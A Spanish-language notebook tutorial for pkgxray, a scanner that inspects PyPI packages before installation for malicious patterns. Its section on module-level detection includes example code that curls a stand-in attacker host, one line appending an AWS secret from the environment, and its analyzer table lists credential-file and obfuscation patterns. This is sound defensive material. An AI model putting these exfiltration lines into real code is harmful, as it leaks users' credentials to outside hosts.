# pkgxray — Radiografía de paquetes PyPI antes de instalarlos

[![PyPI](https://img.shields.io/pypi/v/pkgxray)](https://pypi.org/project/pkgxray/)
[![Python](https://img.shields.io/pypi/pyversions/pkgxray)](https://pypi.org/project/pkgxray/)
[![License](https://img.shields.io/pypi/l/pkgxray)](https://github.com/maip-fred/pkgxray/blob/main/LICENSE)
[![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/maip-fred/pkgxray/blob/main/notebooks/pkgxray_tutorial.ipynb)

---

Cada vez que ejecutas `pip install algo` confías ciegamente en que ese paquete es seguro.  
Pero en PyPI existen paquetes maliciosos que:

- Roban API keys y tokens de variables de entorno
- Abren conexiones de red para exfiltrar datos
- Ejecutan comandos del sistema operativo en segundo plano
- Inyectan código en `setup.py` que corre al instalar
- Esconden payloads con `exec(base64.b64decode(...))`

**pkgxray** descarga el paquete *sin instalarlo*, extrae el código fuente y lo analiza con **8 analizadores basados en AST** para detectar estos patrones antes de que una sola línea de código externo se ejecute en tu máquina.

---

### Cómo funciona

```
pkgxray scan <paquete>
      │
      ▼
1. DESCARGA   → Consulta la API de PyPI, descarga el .tar.gz/.whl (sin instalar)
      │
      ▼
2. EXTRACCIÓN → Descomprime y extrae todos los archivos .py
      │
      ▼
3. ANÁLISIS   → Ejecuta 8 analizadores AST sobre cada archivo
      │
      ▼
4. PUNTUACIÓN → Score 0-100 ponderado por severidad (LOW=1 MEDIUM=3 HIGH=7 CRITICAL=15)
      │
      ▼
5. REPORTE    → Terminal (colores), JSON o HTML
```

### Los 8 analizadores

| Analizador | Qué detecta | Severidad máx |
|---|---|---|
| `code_exec` | `eval()`, `exec()`, `compile()` | CRITICAL |
| `network` | `urlopen()`, `requests.get()`, `socket.connect()` | CRITICAL |
| `filesystem` | `os.remove()`, `shutil.rmtree()`, `/etc/passwd`, `~/.ssh/` | CRITICAL |
| `env_access` | `os.environ`, `os.getenv()`, API keys y tokens | HIGH |
| `subprocess` | `subprocess.Popen()`, `os.system()`, `os.execvp()` | CRITICAL |
| `obfuscation` | `exec(base64.b64decode(...))`, strings hexadecimales | CRITICAL |
| `setup_scripts` | Hooks post-instalación en `setup.py` | CRITICAL |
| `dynamic_imports` | `__import__()`, `importlib.import_module()` dinámico | HIGH |

> **Nivel de módulo:** si una llamada peligrosa está fuera de funciones/clases, se eleva a CRITICAL porque se ejecuta automáticamente al importar el paquete.

---
## 0. Instalación

Instalamos la última versión desde PyPI. El flag `--upgrade` asegura que siempre tengas la versión más reciente.

In [ ]:
!pip install pkgxray==0.2.1 --no-cache-dir -q

import pkgxray
print(f"pkgxray {pkgxray.__version__} instalado correctamente")

---
## 1. Primer escaneo — uso desde la terminal

La forma más directa: `pkgxray scan <paquete>`.  
Empezamos con `more-itertools`, una librería de utilidades puras sin comportamiento de red ni sistema.

In [ ]:
!pkgxray scan more-itertools

Ahora comparamos con `requests`, que activamente hace conexiones HTTP:

In [ ]:
!pkgxray scan requests

---
## 2. API de Python

Además del CLI, pkgxray expone una API Python para integrarse en scripts o pipelines de CI/CD.

In [ ]:
from pkgxray import scan

result = scan("requests")

print(f"Paquete            : {result.package_name} {result.version}")
print(f"Fecha de análisis  : {result.scan_date}")
print(f"Archivos analizados: {result.files_analyzed}")
print(f"Hallazgos totales  : {len(result.findings)}")
print()
print(f"Score de riesgo    : {result.risk_score}/100")
print(f"Nivel de riesgo    : {result.risk_level}")

### 2.1 Inspeccionando los hallazgos

Cada `Finding` contiene:
- `severity`: LOW / MEDIUM / HIGH / CRITICAL
- `analyzer_name`: cuál de los 8 analizadores lo detectó
- `filename` y `line_number`: dónde exactamente en el código fuente
- `description`: qué se detectó
- `code_snippet`: la línea de código exacta

In [ ]:
from pkgxray.analyzers.base import Severity

# Filtrar solo hallazgos de alta severidad
hallazgos_graves = [
    f for f in result.findings
    if f.severity in (Severity.HIGH, Severity.CRITICAL)
]

print(f"Hallazgos HIGH/CRITICAL en requests: {len(hallazgos_graves)}")
print()

# Mostrar los primeros 6
for f in hallazgos_graves[:6]:
    print(f"  [{f.severity.value.upper():8}] [{f.analyzer_name}]")
    print(f"  {f.filename}:{f.line_number}")
    print(f"  {f.description}")
    if f.code_snippet:
        print(f"  >>> {f.code_snippet[:90]}")
    print()

### 2.2 Distribución de hallazgos por analizador y severidad

In [ ]:
from collections import Counter

por_analizador = Counter(f.analyzer_name for f in result.findings)
por_severidad  = Counter(f.severity.value for f in result.findings)

print("Hallazgos por analizador:")
for nombre, n in sorted(por_analizador.items(), key=lambda x: -x[1]):
    barra = "█" * n
    print(f"  {nombre:<20} {n:>3}  {barra}")

print()
print("Hallazgos por severidad:")
for sev in ["critical", "high", "medium", "low"]:
    n = por_severidad.get(sev, 0)
    barra = "█" * min(n, 40)  # limitar la barra para que quepa
    print(f"  {sev:<10} {n:>3}  {barra}")

---
## 3. Exportar el reporte

pkgxray soporta tres formatos de salida: **terminal** (con colores via rich), **JSON** (para automatización) y **HTML** (visual, para compartir).

In [ ]:
from pkgxray.reporter import generate_report
import json

# Exportar como JSON
json_str = generate_report(result, format="json")
data = json.loads(json_str)

print("Estructura del reporte JSON:")
for clave, valor in data.items():
    if isinstance(valor, list):
        print(f"  {clave}: [{len(valor)} elementos]")
    else:
        print(f"  {clave}: {valor}")

print()
print("Primer hallazgo en JSON:")
print(json.dumps(data["findings"][0], indent=2, ensure_ascii=False))

In [ ]:
# Guardar reporte HTML y mostrarlo en el notebook
generate_report(result, format="html", output_path="reporte_requests.html")
print("Reporte guardado en reporte_requests.html")

from IPython.display import IFrame
IFrame("reporte_requests.html", width="100%", height="550")

---
## 4. Comparativa de paquetes

Analizamos paquetes con distintos perfiles de riesgo para validar que el scorer sea coherente:

- **Utilidades puras** (more-itertools, attrs): sin red, sin sistema → score bajo
- **CLI** (click): algo de env y filesystem, uso legítimo → score moderado
- **Cliente HTTP** (requests): conexiones de red activas → score más alto
- **SSH** (paramiko): red, criptografía, filesystem → score alto

In [ ]:
paquetes = [
    ("more-itertools", "utilidades puras"),
    ("attrs",          "utilidades puras"),
    ("click",          "CLI / entrada-salida"),
    ("requests",       "cliente HTTP"),
    ("paramiko",       "cliente SSH"),
]

resultados = []
for pkg, tipo in paquetes:
    r = scan(pkg)
    resultados.append((pkg, tipo, r.risk_score, r.risk_level, len(r.findings)))
    print(f"  ✓ {pkg}")

print()
print(f"{'Paquete':<20} {'Tipo':<22} {'Score':>6}   {'Nivel':<10} {'Hallazgos'}")
print("-" * 70)
for pkg, tipo, score, nivel, n in resultados:
    print(f"{pkg:<20} {tipo:<22} {score:>5}/100   {nivel:<10} {n}")

print()
print("Escala:  0-20 LOW  |  21-40 MODERATE  |  41-70 HIGH  |  71-100 CRITICAL")

---
## 5. Analizar una versión específica

Útil para auditar antes de actualizar una dependencia: puedes comparar la versión actual con la nueva antes de hacer el upgrade.

In [ ]:
r_vieja = scan("requests", version="2.20.0")
r_nueva = scan("requests")  # última versión

print(f"requests 2.20.0  →  {r_vieja.risk_score}/100 {r_vieja.risk_level}  ({len(r_vieja.findings)} hallazgos)")
print(f"requests latest  →  {r_nueva.risk_score}/100 {r_nueva.risk_level}  ({len(r_nueva.findings)} hallazgos)")

---
## 6. Detección de ejecución al nivel del módulo

Una de las características clave de pkgxray v0.2.0: distinguir entre código que corre **automáticamente al importar** (nivel de módulo) y código dentro de funciones que requiere invocación explícita.

Un paquete malicioso típico hace algo así en su `__init__.py`:

```python
# Este código corre en el momento en que el usuario hace: import paquete_malicioso
import subprocess, os
subprocess.run(["curl", "http://evil.com/?key=" + os.environ.get("AWS_SECRET_KEY", "")])
```

pkgxray detecta que la llamada está fuera de cualquier función y la eleva a **CRITICAL**.

In [ ]:
from pkgxray.analyzers.subprocess_calls import SubprocessAnalyzer
from pkgxray.analyzers.network import NetworkAnalyzer

# Código MALICIOSO: llamada peligrosa al nivel del módulo
codigo_malicioso = """
import subprocess

# Esto se ejecuta AUTOMÁTICAMENTE cuando el usuario hace: import paquete
subprocess.run(["curl", "-s", "http://evil.example.com/exfil"])
"""

# Código LEGÍTIMO: misma llamada pero dentro de una función
codigo_legitimo = """
import subprocess

def compilar():
    # Solo corre cuando el usuario llama explícitamente a compilar()
    subprocess.run(["make", "build"])
"""

analyzer = SubprocessAnalyzer()
f_malo  = analyzer.analyze(codigo_malicioso, "__init__.py")
f_bueno = analyzer.analyze(codigo_legitimo,  "build.py")

print("=== Código MALICIOSO (nivel de módulo) ===")
for f in f_malo:
    print(f"  [{f.severity.value.upper():8}] {f.description}")

print()
print("=== Código LEGÍTIMO (dentro de función) ===")
for f in f_bueno:
    print(f"  [{f.severity.value.upper():8}] {f.description}")

In [ ]:
# Lo mismo aplica para network y code_exec
from pkgxray.analyzers.code_exec import CodeExecAnalyzer

# eval() a nivel de módulo = se ejecuta al importar = CRITICAL
# eval() dentro de función = requiere llamada explícita = HIGH

analyzer_exec = CodeExecAnalyzer()

modulo = analyzer_exec.analyze('eval(user_data)', '__init__.py')
funcion = analyzer_exec.analyze('def procesar(x):\n    return eval(x)', 'utils.py')

print(f"eval() a nivel de módulo  → {modulo[0].severity.value.upper()}")
print(f"eval() dentro de función  → {funcion[0].severity.value.upper()}")

---
## 7. Uso avanzado: integración en scripts de CI/CD

pkgxray puede usarse programáticamente para bloquear instalaciones riesgosas en pipelines automatizados.

In [ ]:
def auditar_dependencias(paquetes: list, umbral_score: int = 70) -> bool:
    """
    Analiza una lista de paquetes y bloquea si alguno supera el umbral de riesgo.
    Retorna True si todos son seguros, False si alguno es riesgoso.
    """
    todos_seguros = True
    print(f"Auditando {len(paquetes)} dependencias (umbral: {umbral_score}/100)...\n")

    for pkg in paquetes:
        r = scan(pkg)
        estado = "✓ OK     " if r.risk_score <= umbral_score else "✗ BLOQUEADO"
        print(f"  {estado}  {pkg:<20} {r.risk_score:>3}/100  {r.risk_level}")
        if r.risk_score > umbral_score:
            todos_seguros = False

    print()
    if todos_seguros:
        print("Todas las dependencias pasaron la auditoría.")
    else:
        print("ADVERTENCIA: Algunas dependencias superan el umbral de riesgo.")
    return todos_seguros


# Simular auditoría de un requirements.txt
mis_dependencias = ["more-itertools", "click", "requests"]
auditar_dependencias(mis_dependencias, umbral_score=70)

---
## 8. pkgxray vs otras herramientas

| Herramienta | Qué analiza | Cuándo actúa | Analiza código |
|---|---|---|---|
| `pip-audit` / `safety` | CVEs en base de datos pública | Después de instalar | No |
| `bandit` | Tu propio código fuente | En tu repositorio | Sí, pero solo tu código |
| **`pkgxray`** | Comportamiento de paquetes de terceros | **Antes de instalar** | **Sí, con AST** |

pkgxray es complementario — no reemplaza a pip-audit, sino que cubre el caso que ninguna otra herramienta cubre: análisis de comportamiento **antes** de la instalación.

---
## Conclusión

pkgxray cubre un vacío real en el ecosistema de Python:

- **Descarga sin instalar** — nunca ejecuta código del paquete analizado
- **AST en lugar de regex** — entiende la estructura del código, no solo el texto
- **8 analizadores especializados** — cada uno enfocado en una categoría de riesgo
- **Detección de nivel de módulo** — identifica código que corre automáticamente al importar
- **Score calibrado** — minimiza falsos positivos en paquetes legítimos
- **Múltiples formatos de salida** — terminal, JSON y HTML

```bash
pip install pkgxray
pkgxray scan <paquete>
```

**GitHub:** [maip-fred/pkgxray](https://github.com/maip-fred/pkgxray)  
**PyPI:** [pypi.org/project/pkgxray](https://pypi.org/project/pkgxray/)